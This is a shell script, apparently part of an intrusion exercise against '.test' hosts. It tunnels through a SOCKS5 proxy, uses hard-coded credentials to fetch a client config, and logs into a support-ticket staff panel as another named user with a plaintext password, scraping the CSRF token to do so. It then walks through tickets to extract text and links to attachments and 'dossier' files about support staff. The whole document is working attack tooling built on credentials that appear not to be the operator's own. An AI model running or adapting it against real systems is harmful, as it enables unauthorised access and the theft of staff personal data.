CA=$HOME/k25/ca.crt; P="--socks5-hostname 127.0.0.1:1080"
U="rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo"
B=https://delivery.keplerops.test:8443
curl -sS $P --cacert $CA -m 25 -u "$U" "$B/.well-known/fieldkest-client" -o /tmp/dwk.json -w '[%{http_code}]\n'
python3 -c "import json;d=json.load(open('/tmp/dwk.json'));print(json.dumps(d,indent=1))"
echo "===== support staff dossier hints in ticket 6/5/4/3/2"
CK=/tmp/k25-ck2.txt; S=https://support.keplerops.test
curl -sS $P --cacert $CA -m 25 -c $CK -o /tmp/lg.html "$S/scp/login.php"
TOK=$(grep -oE 'name="__CSRFToken__" value="[^"]+"' /tmp/lg.html | head -1 | sed 's/.*value="//;s/"//')
curl -sS $P --cacert $CA -m 25 -c $CK -b $CK -o /dev/null -w 'login:%{http_code}\n' \
 --data-urlencode "__CSRFToken__=$TOK" --data-urlencode "do=scplogin" \
 --data-urlencode "userid=maya.ranscombe" --data-urlencode "passwd=sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk" \
 --data-urlencode "dst=$S/scp/tickets.php" "$S/scp/login.php"
for i in 1 2 3 4 5 6; do
  curl -sS $P --cacert $CA -m 25 -b $CK -o /tmp/z$i.html "$S/scp/tickets.php?id=$i"
  echo "##### ticket $i $(grep -oE '(SUP|ESC|REV|MTN)-[0-9]+' /tmp/z$i.html | head -1)"
  python3 - <<PY
import re
h=open('/tmp/z$i.html',errors='replace').read()
h=re.sub(r'<script.*?</script>',' ',h,flags=re.S)
h=re.sub(r'<style.*?</style>',' ',h,flags=re.S)
for m in re.finditer(r'(?:href|src)="([^"]*(?:file\.php|attach|download|dossier)[^"]*)"',h,re.I):
    print('LINK:',m.group(1)[:200])
t=re.sub(r'<[^>]+>','\n',h); t=re.sub(r'\n\s*\n+','\n',t)
lines=[l.strip() for l in t.split('\n') if l.strip()]
print('\n'.join(lines[:160]))
PY
done
